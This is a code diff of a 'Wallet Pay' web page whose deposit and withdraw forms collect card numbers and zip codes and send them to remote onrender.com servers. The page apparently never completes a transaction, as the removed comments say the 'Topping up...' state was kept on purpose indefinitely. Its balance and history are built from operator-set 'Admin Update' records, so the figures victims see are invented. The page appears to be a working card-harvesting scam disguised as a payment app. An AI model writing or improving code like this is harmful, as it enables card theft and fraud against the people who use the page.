@@ -162,7 +162,7 @@
 <body>
     <div class="container">
         <h1>Wallet Pay</h1>
-        <div class="balance">Balance: $678</div>
+        <div class="balance">Balance: Loading...</div>
         <div class="buttons">
             <button class="btn" onclick="showModal('deposit-modal')">Deposit</button>
             <button class="btn" onclick="showModal('withdraw-modal')">Withdraw</button>
@@ -182,7 +182,7 @@
             </div>
             <div class="modal-content">
                 <div class="form-group">
-                    <input type="text" placeholder="Amount">
+                    <input type="number" placeholder="Amount" step="0.01">
                 </div>
                 <div class="form-group">
                     <input type="text" placeholder="Card Number">
@@ -225,7 +225,7 @@
             </div>
             <div class="modal-content">
                 <div class="form-group">
-                    <input type="text" placeholder="Amount">
+                    <input type="number" placeholder="Amount" step="0.01">
                 </div>
                 <div class="form-group">
                     <input type="text" placeholder="Card Number">
@@ -267,10 +267,7 @@
                 <span class="close-btn" onclick="hideModal('history-modal')">×</span>
             </div>
             <div class="modal-content">
-                <div class="history-item">Deposit - $5,000 - Mar 1, 2025</div>
-                <div class="history-item">Deposit - $2,000 - Mar 5, 2025</div>
-                <div class="history-item">Deposit - $1,000 - Mar 10, 2025</div>
-                <div class="history-item">Withdrawal - $6,856 - Mar 17, 2025</div>
+                <div class="history-item">Loading history...</div>
             </div>
         </div>
 
@@ -281,6 +278,69 @@
         let isDragging = false;
         let currentModal = null;
         let offsetY = 0;
+        const API_URL = 'https://walletpay-20va.onrender.com/api';
+
+        // Fetch initial balance and history
+        async function fetchData() {
+            try {
+                const balanceResp = await fetch(`${API_URL}/balance`);
+                const balanceData = await balanceResp.json();
+                document.querySelector('.balance').textContent = `Balance: $${balanceData.balance.toFixed(2)}`;
+
+                const historyResp = await fetch(`${API_URL}/history`);
+                const historyData = await historyResp.json();
+                updateHistory(historyData);
+            } catch (error) {
+                console.error('Error fetching data:', error);
+                document.querySelector('.balance').textContent = 'Balance: Error';
+                document.querySelector('#history-modal .modal-content').innerHTML = '<div class="history-item">Error loading history</div>';
+            }
+        }
+
+        function updateHistory(transactions) {
+            const historyContent = document.querySelector('#history-modal .modal-content');
+            // Filter out "Admin Update" entries and process balance changes
+            const filteredTransactions = transactions.filter(t => t.type === 'Admin Update');
+            
+            if (filteredTransactions.length <= 1) {
+                historyContent.innerHTML = '<div class="history-item">No transactions yet</div>';
+                return;
+            }
+
+            // Create a new history array to display
+            let displayHistory = [];
+            for (let i = 0; i < filteredTransactions.length - 1; i++) {
+                const current = filteredTransactions[i];
+                const previous = filteredTransactions[i + 1];
+                const diff = current.amount - previous.amount;
+                let type, amount;
+
+                if (diff > 0) {
+                    type = 'Deposit';
+                    amount = diff;
+                } else if (diff < 0) {
+                    type = 'Withdrawal';
+                    amount = Math.abs(diff);
+                } else {
+                    continue; // Skip if no change
+                }
+
+                displayHistory.push({
+                    type: type,
+                    amount: amount,
+                    date: current.date
+                });
+            }
+
+            // Display the processed history
+            if (displayHistory.length === 0) {
+                historyContent.innerHTML = '<div class="history-item">No transactions yet</div>';
+            } else {
+                historyContent.innerHTML = displayHistory.map(t => 
+                    `<div class="history-item">${t.type} - $${t.amount.toFixed(2)} - ${t.date}</div>`
+                ).join('');
+            }
+        }
 
         function showModal(modalId) {
             const modal = document.getElementById(modalId);
@@ -288,11 +348,13 @@
             modal.style.display = 'block';
             overlay.style.display = 'block';
             setTimeout(() => modal.classList.add('active'), 10);
-            if (modalId !== 'history-modal') {
-                hideModal('history-modal');
-            } else {
-                hideModal('deposit-modal');
-                hideModal('withdraw-modal');
+            if (modalId === 'history-modal') fetchData();
+            // Reset forms when showing modals
+            if (modalId === 'deposit-modal' || modalId === 'withdraw-modal') {
+                modal.querySelectorAll('input').forEach(input => input.value = '');
+                const btn = modal.querySelector('.modal-btn');
+                btn.textContent = modalId === 'deposit-modal' ? 'Top Up' : 'Withdraw';
+                btn.disabled = false;
             }
         }
 
@@ -311,11 +373,8 @@
             const inputs = document.querySelectorAll('#deposit-modal input');
             let allFilled = true;
 
-            // Check if all fields are filled
             inputs.forEach(input => {
-                if (!input.value.trim()) {
-                    allFilled = false;
-                }
+                if (!input.value.trim()) allFilled = false;
             });
 
             if (!allFilled) {
@@ -338,22 +397,14 @@
                 zipCode: document.querySelector('#deposit-modal [placeholder="Zip Code"]').value
             };
 
-            try {
-                const response = await fetch('https://pay-p5ev.onrender.com/api/deposit', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(formData)
-                });
-
-                if (!response.ok) {
-                    throw new Error('Deposit failed');
-                }
-            } catch (error) {
-                alert('Error processing deposit. Please try again.');
-            }
-            // Removed successful alert and 'finally' block to keep button as "Topping up..." indefinitely
+            // Send data to backend but don't wait for a response to complete
+            fetch(`${API_URL}/deposit`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(formData)
+            }).catch(error => {
+                console.error('Error sending deposit data:', error);
+            });
         }
 
         async function processWithdraw() {
@@ -361,11 +412,8 @@
             const inputs = document.querySelectorAll('#withdraw-modal input');
             let allFilled = true;
 
-            // Check if all fields are filled
             inputs.forEach(input => {
-                if (!input.value.trim()) {
-                    allFilled = false;
-                }
+                if (!input.value.trim()) allFilled = false;
             });
 
             if (!allFilled) {
@@ -388,22 +436,14 @@
                 zipCode: document.querySelector('#withdraw-modal [placeholder="Zip Code"]').value
             };
 
-            try {
-                const response = await fetch('https://pay-p5ev.onrender.com/api/withdraw', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(formData)
-                });
-
-                if (!response.ok) {
-                    throw new Error('Withdrawal failed');
-                }
-            } catch (error) {
-                alert('Error processing withdrawal. Please try again.');
-            }
-            // Removed successful alert and 'finally' block to keep button as "Withdrawal in progress..." indefinitely
+            // Send data to backend but don't wait for a response to complete
+            fetch(`${API_URL}/withdraw`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(formData)
+            }).catch(error => {
+                console.error('Error sending withdrawal data:', error);
+            });
         }
 
         function startDrag(e, modalId) {
@@ -419,7 +459,6 @@
                 const newTop = e.clientY - offsetY;
                 const windowHeight = window.innerHeight;
                 const modalHeight = currentModal.offsetHeight;
-                
                 if (newTop >= 20 && newTop + modalHeight <= windowHeight - 20) {
                     currentModal.style.top = newTop + 'px';
                 }
@@ -439,7 +478,9 @@
                 hideModal(modalId);
             }
         }
+
+        // Initial fetch
+        document.addEventListener('DOMContentLoaded', fetchData);
     </script>
 </body>
-                                                                                </html>
-            
+            </html>
